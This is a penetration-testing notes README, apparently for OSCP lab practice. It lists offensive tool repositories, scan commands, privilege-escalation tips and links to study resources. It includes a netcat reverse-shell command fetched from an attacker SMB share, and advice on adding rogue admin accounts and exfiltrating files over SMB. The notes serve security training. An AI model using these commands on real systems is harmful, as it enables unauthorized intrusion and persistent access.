Prettier version here: https://moshekaplan.github.io/pentesting_notes/

Pull requests welcome.

# Preparing your environment

Clone the following repositories:

* https://github.com/superkojiman/onetwopunch - Wrapper around nmap/unicorn scanner
* https://github.com/AutoRecon/AutoRecon - Another recon script
* https://github.com/danielmiessler/SecLists - Wordlists
* https://github.com/mthbernardes/rsg - Reverse shell generator
* https://github.com/rebootuser/LinEnum - Linux privesc enumeration
* https://github.com/mzet-/linux-exploit-suggester - Linux privesc enumeration
* https://github.com/M4ximuss/Powerless - Windows privesc enumeration (non-powershell)
* https://github.com/411Hall/JAWS - Windows privesc enumeration (powershell)
* https://github.com/absolomb/WindowsEnum - Windows privesc enumeration (powershell)
* https://github.com/SecWiki/windows-kernel-exploits - Precompiled Windows kernel exploits
* https://github.com/51x/WHP - Collection of Windows attack tools and exploits
* https://github.com/AusJock/Privilege-Escalation - Windows/Linux kernel exploits
* https://github.com/GDSSecurity/Windows-Exploit-Suggester - Script that parses `systeminfo` output to suggest exploits

Or as a list of commands:
```
git clone --depth 1 https://github.com/superkojiman/onetwopunch.git
git clone --depth 1 https://github.com/AutoRecon/AutoRecon.git
git clone --depth 1 https://github.com/danielmiessler/SecLists.git
git clone --depth 1 https://github.com/mthbernardes/rsg.git
git clone --depth 1 https://github.com/rebootuser/LinEnum.git
git clone --depth 1 https://github.com/mzet-/linux-exploit-suggester.git
git clone --depth 1 https://github.com/M4ximuss/Powerless.git
git clone --depth 1 https://github.com/411Hall/JAWS.git
git clone --depth 1 https://github.com/absolomb/WindowsEnum.git
git clone --depth 1 https://github.com/SecWiki/windows-kernel-exploits.git
git clone --depth 1 https://github.com/51x/WHP.git
git clone --depth 1 https://github.com/AusJock/Privilege-Escalation.git
git clone --depth 1 https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

# Starting a pentest

Beginning a pentest against a host? Start with the following commands:

```
nmap -A -sV --script=default,vuln,smb-vuln* -p- --open -oA tcp_10.11.1.x 10.11.1.x
nmap -A -sV -sU --script=default,vuln --open -oA udp_10.11.1.x 10.11.1.x
echo "10.11.1.x" > 10.11.1.x_target.txt && ../tools/onetwopunch.sh  -i tap0 -t 10.11.1.x_target.txt
```

Ideally, your goal is to enumerate your _attack surface_ in as much detail as possible: all exposed services, with full details (version, modules, and configuration)

# Protocol specific notes

## HTTP
HTTP consists of several components:
* Web server
* Programming language (if any)
* Back-end platform/framework (Drupal, Wordpress, etc.) and plugins
* Front-end UI

Other notes:
* Each component has its own vulnerabilities. Front-end vulns are useful for XSS and the like.
* A web server listens on one or more ports. It can also run multiple languages and multiple frameworks at different paths.

### Web Servers:
* Apache, nginx, and Microsoft IIS are most common.
* Less-common webservers are more likely to have vulnerabilities and misconfigurations

### Nikto

Use Nikto to scan for vulns
`nikto -h [IP] -p [PORT] -o "[OUTPUT].txt"`

### Coldfusion
Colfusion guide: https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers


## SMB
For Linux targets running SMB, it may be possible to find a version number in the raw network traffic with Wireshark in
the `smb.native_lanman` field.

# Lessons Learned

## Exploitation

If an exploit looks like it should be succesful, but is failing to connect back with a reverse shell, try cycling through common ports: 80, 443, 8080, 53

Try using other payloads besides reverse shell, if the exploit works. Adding an admin/root user and connecting via SSH/RDP is an alternative to an immediate root shell.

* Reverse shell one-liners: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# General Privilege escalation
## Ports for reverse shell
Trying to figure out if a port is available for further connect-back? Try nmap + wireshark

On compromised host, run: `nmap -sV -P0 -p- 10.11.0.57`

On attacker system, use the following wireshark filter: `ip.src == 10.11.1.252 && tcp.flags.syn == 1 && tcp.flags.ack == 0`

## Lazy credentials
If you see lazy passwords in one place of admin/admin, expect that there might be lazy passwords in other places too.


# Windows Privilege escalation
* `accesschk.exe /accepteula -c *` for seeing services with RW access, so the service image path itself can be changed.
* https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
* Sometimes files may be hidden. Use `dir /A` instead of dir.
* https://guif.re/windowseop

## Run/Transfer/Exfil files with SMB:
SMB server on Kali box is easiest way to run/transfer/exfil files.

## Second shell
After getting a shell, get a second shell with "start" in case the first one bugs up/hangs/crashes:

attacker $ `python /usr/share/doc/python-impacket/examples/smbserver.py share  /www`

victim > `start  \\10.11.0.57\share\nc.exe -nv -e cmd.exe 10.11.0.57 80`

## Windows privesc enumeration scripts

* `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`

## Windows Privesc online resources
* https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
* Exploits: http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation
* http://www.fuzzysecurity.com/tutorials/16.html
* https://toshellandback.com/2015/11/24/ms-priv-esc/


# Linux Privilege escalation
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* Local Linux Enumeration & Privilege Escalation Cheatsheet - https://www.rebootuser.com/?p=1623

# Writing Exploits:
* https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
* When in doubt, it may be wise to assume common badchars (`\x00`, `CR`, `LF`, ` `)
* Online assembler: https://defuse.ca/online-x86-assembler.htm

# Online Resources

* https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html - Amazing resource on methodology
* https://github.com/DigitalAftermath/EnumerationVisualized/wiki
* https://forums.offensive-security.com/showthread.php?4689-Offensive-Security-s-Complete-Guide-to-Alpha
* https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
* https://sushant747.gitbooks.io/total-oscp-guide/
* https://blog.ropnop.com/transferring-files-from-kali-to-windows/ - File Transfer techniques
* http://www.fuzzysecurity.com/tutorials/16.html
* https://guif.re
* https://jhalon.github.io/OSCP-Review/
* https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/
* https://411hall.github.io/JAWS-Enumeration/
* https://www.securitysift.com/offsec-pwb-oscp/
